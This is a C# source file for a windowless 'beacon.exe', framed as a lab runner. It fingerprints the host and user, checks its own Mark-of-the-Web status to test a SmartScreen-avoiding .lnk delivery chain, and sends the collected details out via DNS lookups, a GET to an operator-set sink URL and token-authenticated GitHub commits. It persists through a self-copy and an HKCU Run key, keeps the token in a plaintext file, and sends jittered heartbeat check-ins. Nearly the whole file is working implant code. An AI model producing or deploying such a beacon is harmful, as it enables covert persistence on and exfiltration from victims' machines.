// syncache lab runner ("beacon.exe" for the zip tests) — deterministic, windowless,
// no dialogs. Every lane records its outcome into local receipt files FIRST, then
// tries network receipts. Exit code is ALWAYS 0 (courier semantics: the receipt is
// the alive-signal, process lifetime means nothing - 0db6f0b2bff5).
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Microsoft.Win32.SafeHandles;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class Beacon
{
    const int NetTimeoutMs = 4000;

    static int ParseInt(string s, int dflt)
    {
        int v; return int.TryParse(s, out v) && v >= 0 ? v : dflt;
    }

    static string RebuildArgs(Dictionary<string, string> a)
    {
        // keep boot-run config identical; token travels via token.cfg instead
        string[] keys = { "tag", "echo", "gh", "get", "dns", "alive", "hb", "persist", "runname" };
        List<string> parts = new List<string>();
        foreach (string k in keys)
        {
            if (k == "persist") { if (a.ContainsKey(k)) parts.Add("--persist"); continue; }
            if (a.ContainsKey(k) && k != "persist") parts.Add("--" + k + " \"" + a[k] + "\"");
        }
        return string.Join(" ", parts.ToArray());
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern SafeFileHandle CreateFileW(string name, uint access, uint share,
        IntPtr sa, uint disp, uint flags, IntPtr templ);

    static string J(string s)
    {
        if (s == null) return "";
        StringBuilder b = new StringBuilder();
        foreach (char c in s)
        {
            if (c == '"') b.Append("\\\"");
            else if (c == '\\') b.Append("\\\\");
            else if (c == '\n') b.Append("\\n");
            else if (c == '\r') b.Append("\\r");
            else if (c == '\t') b.Append("\\t");
            else if (c < ' ') b.Append(string.Format("\\u{0:x4}", (int)c));
            else b.Append(c);
        }
        return b.ToString();
    }

    static string B64(string utf8)
    {
        return Convert.ToBase64String(Encoding.UTF8.GetBytes(utf8));
    }

    static HttpWebResponse Try(string name, List<string> log, Func<HttpWebResponse> f)
    {
        try { HttpWebResponse r = f(); log.Add(name + ":HTTP " + (int)r.StatusCode); return r; }
        catch (WebException we)
        {
            HttpWebResponse hr = we.Response as HttpWebResponse;
            if (hr != null) { log.Add(name + ":HTTP " + (int)hr.StatusCode); return hr; }
            log.Add(name + ":ERR " + we.Status + " " + J(we.Message));
        }
        catch (Exception e) { log.Add(name + ":ERR " + J(e.GetType().Name + " " + e.Message)); }
        return null;
    }

    static int Main(string[] argv)
    {
        ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12;
        // flags may carry a value OR stand alone; a trailing bare flag still counts
        Dictionary<string, string> a = new Dictionary<string, string>();
        for (int i = 0; i < argv.Length; i++)
        {
            if (!argv[i].StartsWith("--")) continue;
            string key = argv[i].Substring(2);
            if (i + 1 < argv.Length && !argv[i + 1].StartsWith("--")) { a[key] = argv[i + 1]; i++; }
            else a[key] = "1";
        }
        string tag = a.ContainsKey("tag") ? a["tag"] : "manual";
        string echoText = a.ContainsKey("echo") ? a["echo"] : "";
        string token = a.ContainsKey("token") ? a["token"] : Environment.GetEnvironmentVariable("GMR");
        if (token != null) token = token.Trim((char)0, ' ', '\t', '\r', '\n');   // CM blobs carry NULs
        string gh = a.ContainsKey("gh") ? a["gh"] : "";              // owner/repo
        string getUrl = a.ContainsKey("get") ? a["get"] : "";        // sink: {t} {h} {u} {tag} substituted
        string dnsDom = a.ContainsKey("dns") ? a["dns"] : "";        // per-run label prepended
        bool noWrite = a.ContainsKey("no-write");
        string outDir = a.ContainsKey("out") ? a["out"] : null;      // override for lab tests
        int aliveS = a.ContainsKey("alive") ? ParseInt(a["alive"], 0) : 0;   // heartbeat window seconds
        int hbS = a.ContainsKey("hb") ? ParseInt(a["hb"], 20) : 20;          // beat interval
        bool persist = a.ContainsKey("persist");                             // HKCU Run self-copy
        bool uninstall = a.ContainsKey("uninstall");
        string runName = a.ContainsKey("runname") ? a["runname"] : "SyncCache";

        // ---- facts (never trust wall alone for cross-box ordering - clock law) ----
        string tsUtc = DateTime.UtcNow.ToString("yyyyMMddTHHmmssZ");
        string host = Environment.MachineName;
        string user = Environment.UserName;
        string exe = Process.GetCurrentProcess().MainModule.FileName;
        string sha = "";
        try
        {
            using (var fs = File.OpenRead(exe))
            using (var h = SHA256.Create())
            {
                byte[] d = h.ComputeHash(fs);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 16; i++) sb.Append(d[i].ToString("x2"));
                sha = sb.ToString();
            }
        }
        catch (Exception e) { sha = "ERR " + e.GetType().Name; }

        // LANE 0: MOTW SELF-SENSORSHIP - does MY file carry a zone mark?
        // "no-ADS"  = fetched without Mark-of-the-Web (the .lnk-chain property
        //              we are testing; SmartScreen reputation path not engaged)
        // "ZoneId=3" = browser/intranet-marked landing (SmartScreen CAN engage)
        // NOTE (measured 2026-10-27): .NET Framework File.OpenRead REJECTS ADS
        // paths outright ("path's format is not supported") - must go via
        // kernel32 CreateFileW, which accepts "file:Zone.Identifier".
        string zone = "no-ADS";
        string zoneId = "";
        try
        {
            SafeFileHandle h = CreateFileW(exe + ":Zone.Identifier", 0x80000000, 3,
                IntPtr.Zero, 3 /*OPEN_EXISTING*/, 0x80 /*NORMAL*/, IntPtr.Zero);
            if (h.IsInvalid)
            {
                int err = Marshal.GetLastWin32Error();
                zone = err == 2 ? "no-ADS" : "ERR win32=" + err;   // 2 = NOT_FOUND
            }
            else
            {
                using (var fs = new FileStream(h, FileAccess.Read))
                using (var sr = new StreamReader(fs))
                {
                    zone = "ADS-present";
                    string z = sr.ReadToEnd();
                    int i = z.IndexOf("ZoneId=");
                    if (i >= 0) zoneId = z.Substring(i + 7).Trim().Split('\r', '\n')[0];
                }
            }
        }
        catch (Exception e) { zone = "ERR " + e.GetType().Name; }

        List<string> log = new List<string>();
        log.Add("run tag=" + tag + " pid=" + Process.GetCurrentProcess().Id);
        log.Add("motw: own file " + zone + (zoneId == "" ? "" : " ZoneId=" + zoneId));

        // ---- LANE 1: local markers (works with ZERO network; proof-of-execution) ----
        string dir = outDir ?? Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "SyncCache");
        string pub = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);
        try
        {
            Directory.CreateDirectory(dir);
            string json = "{" +
                "\"tag\":\"" + J(tag) + "\"," +
                "\"ts_utc\":\"" + tsUtc + "\"," +
                "\"ts_local\":\"" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "\"," +
                "\"host\":\"" + J(host) + "\",\"user\":\"" + J(user) + "\"," +
                "\"os\":\"" + J(Environment.OSVersion.ToString()) + "\"," +
                "\"x64\":" + (Environment.Is64BitOperatingSystem ? "true" : "false") + "," +
                "\"exe\":\"" + J(exe) + "\",\"sha256_16\":\"" + sha + "\"," +
                "\"motw\":\"" + zone + (zoneId == "" ? "" : " ZoneId=" + zoneId) + "\"," +
                "\"args\":\"" + J(echoText) + "\"" +
                "}";
            File.WriteAllText(Path.Combine(dir, "run-" + tag + "-" + tsUtc + ".json"), json);
            File.WriteAllText(Path.Combine(pub, "scan-" + tag + "-" + tsUtc + ".txt"),
                "SCAN REPORT " + tag + "  ran OK " + tsUtc + " UTC  host=" + host +
                "  user=" + user + "  build=" + sha + "  motw=" + zone +
                (zoneId == "" ? "" : ":" + zoneId) +
                (echoText == "" ? "" : "  note=" + echoText) + "\n");
            log.Add("local:WROTE " + dir + " + " + pub);
        }
        catch (Exception e) { log.Add("local:ERR " + J(e.Message)); }

        // late token source: token.cfg written by a --persist run (boot runs have
        // no env/argv token). LAB FILE, PLAINTEXT: treat like a sticky note.
        string tokCfg = Path.Combine(dir, "token.cfg");
        if (string.IsNullOrEmpty(token))
            try { if (File.Exists(tokCfg)) token = File.ReadAllText(tokCfg).Trim(); } catch { }

        // ---- UNINSTALL: remove anchors + copies, skip all network lanes ----
        if (uninstall)
        {
            try
            {
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    if (k != null && k.GetValue(runName) != null)
                    { k.DeleteValue(runName, false); log.Add("uninstall:runkey-removed " + runName); }
                    else log.Add("uninstall:runkey-absent");
                }
            }
            catch (Exception e) { log.Add("uninstall:runkey-ERR " + J(e.Message)); }
            try
            {
                string dest = Path.Combine(dir, "scancache.exe");
                bool fromCopy = string.Equals(exe, dest, StringComparison.OrdinalIgnoreCase);
                if (File.Exists(dest))
                {
                    if (fromCopy)
                    {
                        Process.Start(new ProcessStartInfo("cmd.exe",
                            "/c ping -n 8 127.0.0.1 >nul & del /q \"" + dest + "\"")
                            { CreateNoWindow = true, UseShellExecute = false });
                        log.Add("uninstall:copy-delayed-delete");
                    }
                    else { File.Delete(dest); log.Add("uninstall:copy-deleted"); }
                }
                if (File.Exists(tokCfg)) File.Delete(tokCfg);
            }
            catch (Exception e) { log.Add("uninstall:copy-ERR " + J(e.Message)); }
            try { File.AppendAllText(Path.Combine(dir, "lanes.log"),
                tsUtc + " " + tag + " " + string.Join(" | ", log.ToArray()) + "\n"); }
            catch { }
            return 0;
        }

        // ---- LANE 2: DNS egress probe (survives most proxy regimes) ----
        if (dnsDom != "")
        {
            string name = tag.ToLower().Replace("_", "-") + "." + dnsDom;
            var t = Task.Run(() => { try { return Dns.GetHostAddresses(name); } catch { return null; } });
            if (t.Wait(3000) && t.Result != null) log.Add("dns:OK " + name + " -> " + t.Result.Length + " addrs");
            else log.Add("dns:FAIL " + name);
        }

        // ---- LANE 3: plain GET sink (any landing you control; wide-grep friendly) ----
        if (getUrl != "")
        {
            string u = getUrl.Replace("{t}", tsUtc).Replace("{h}", Uri.EscapeDataString(host))
                             .Replace("{u}", Uri.EscapeDataString(user)).Replace("{tag}", Uri.EscapeDataString(tag));
            var r = Try("get", log, delegate
            {
                HttpWebRequest q = (HttpWebRequest)WebRequest.Create(u);
                q.Timeout = NetTimeoutMs; q.UserAgent = "scan/1.0";
                return (HttpWebResponse)q.GetResponse();
            });
            if (r != null) try { r.Close(); } catch { }
        }

        // ---- LANE 4: GitHub contents write-back (visible commit in the repo) ----
        string commitSha = "";
        if (!string.IsNullOrEmpty(token) && !noWrite && gh.IndexOf('/') > 0)
        {
            string body =
                "# scan receipt " + tag + "\n\n" +
                "- ts_utc: " + tsUtc + "\n- host: " + host + "\n- user: " + user +
                "\n- os: " + Environment.OSVersion + "\n- exe: " + exe +
                "\n- sha256_16: " + sha + "\n- note: " + echoText + "\n\nlanes:\n" +
                "```\n" + string.Join("\n", log.ToArray()) + "\n```\n";
            string path = "receipts/" + tag + "/" + host + "-" + tsUtc + ".md";
            string json = "{\"message\":\"receipt " + J(tag) + " " + tsUtc + "\"," +
                          "\"content\":\"" + B64(body) + "\"}";
            var r = Try("github", log, delegate
            {
                HttpWebRequest q = (HttpWebRequest)WebRequest.Create(
                    "https://api.github.com/repos/" + gh + "/contents/" + path);
                q.Method = "POST"; q.Timeout = NetTimeoutMs * 2;
                q.UserAgent = "scan"; q.ContentType = "application/json";
                q.Accept = "application/vnd.github+json";
                q.Headers["Authorization"] = "token " + token;
                byte[] pb = Encoding.UTF8.GetBytes(json);
                q.ContentLength = pb.Length;
                using (var s = q.GetRequestStream()) s.Write(pb, 0, pb.Length);
                return (HttpWebResponse)q.GetResponse();
            });
            if (r != null)
            {
                try
                {
                    string resp = r.ReadText();
                    int i = resp.IndexOf("\"sha\":\"");
                    if (i >= 0) { commitSha = resp.Substring(i + 7); int k = commitSha.IndexOf('"'); if (k > 0) commitSha = commitSha.Substring(0, k); log.Add("github:commit " + commitSha); }
                    r.Close();
                }
                catch (Exception e) { log.Add("github:READ-ERR " + J(e.Message)); }
            }
            // reflect the outcome back into the local machine-readable receipt
            try
            {
                File.AppendAllText(Path.Combine(dir, "run-" + tag + "-" + tsUtc + ".json")
                    .Replace(".json", "") + ".lanes.txt", string.Join("\n", log.ToArray()) + "\n");
            }
            catch { }
        }

        // ---- LANE 5: PERSIST (HKCU Run + self-copy; boot runs re-emit receipts) ----
        if (persist)
        {
            try
            {
                string dest = Path.Combine(dir, "scancache.exe");
                if (string.Equals(exe, dest, StringComparison.OrdinalIgnoreCase))
                    log.Add("persist:running-from-copy");
                else { File.Copy(exe, dest, true); log.Add("persist:copied " + dest); }
                if (!string.IsNullOrEmpty(token))
                    try { File.WriteAllText(tokCfg, token); log.Add("persist:token.cfg written (PLAINTEXT lab file)"); }
                    catch (Exception e2) { log.Add("persist:tokencfg-ERR " + J(e2.Message)); }
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    if (k != null)
                    {
                        k.SetValue(runName, "\"" + dest + "\" " + RebuildArgs(a));
                        log.Add("persist:runkey " + runName);
                    }
                    else log.Add("persist:ERR run-key-unavailable");
                }
            }
            catch (Exception e) { log.Add("persist:ERR " + J(e.Message)); }
        }

        // ---- LANE 6: ALIVE heartbeat window (survival signal; ±15% jitter per beat) ----
        if (aliveS > 0)
        {
            Random rnd = new Random(unchecked((int)Stopwatch.GetTimestamp()));
            Stopwatch sw = Stopwatch.StartNew();
            int beats = 0;
            while (sw.Elapsed.TotalSeconds < aliveS)
            {
                int sl = (int)(hbS * 1000.0 * (0.85 + rnd.NextDouble() * 0.30));
                int left = (int)((aliveS - sw.Elapsed.TotalSeconds) * 1000) + 50;
                Thread.Sleep(sl < 1000 ? 1000 : (sl > left ? left : sl));
                beats++;
                log.Add("beat " + beats + " +" + (int)sw.Elapsed.TotalSeconds + "s");
                try { File.AppendAllText(Path.Combine(dir, "beats.log"), tsUtc + " " + tag +
                    " beat=" + beats + " +" + (int)sw.Elapsed.TotalSeconds + "s\n"); }
                catch { }
                if (getUrl != "")
                {
                    string u = getUrl.Replace("{t}", tsUtc).Replace("{h}", Uri.EscapeDataString(host))
                        .Replace("{u}", Uri.EscapeDataString(user))
                        .Replace("{tag}", Uri.EscapeDataString(tag))
                        + (getUrl.IndexOf('?') >= 0 ? "&" : "?") + "beat=" + beats;
                    var rb = Try("beat" + beats, log, delegate
                    {
                        HttpWebRequest q = (HttpWebRequest)WebRequest.Create(u);
                        q.Timeout = NetTimeoutMs; q.UserAgent = "scan/1.0";
                        return (HttpWebResponse)q.GetResponse();
                    });
                    if (rb != null) try { rb.Close(); } catch { }
                }
            }
            log.Add("alive:done after " + (int)sw.Elapsed.TotalSeconds + "s beats=" + beats);
        }

        // final lanes log always on disk
        try { File.AppendAllText(Path.Combine(dir, "lanes.log"),
            tsUtc + " " + tag + " " + string.Join(" | ", log.ToArray()) +
            (commitSha == "" ? "" : " commit=" + commitSha) + "\n"); }
        catch { }
        return 0;
    }

    // small helper so C#5 compiles without extension ambiguity
    static class Ext { }
}

static class ReaderExt
{
    public static string ReadText(this HttpWebResponse r)
    {
        using (var s = r.GetResponseStream())
        using (var sr = new StreamReader(s)) return sr.ReadToEnd();
    }
}
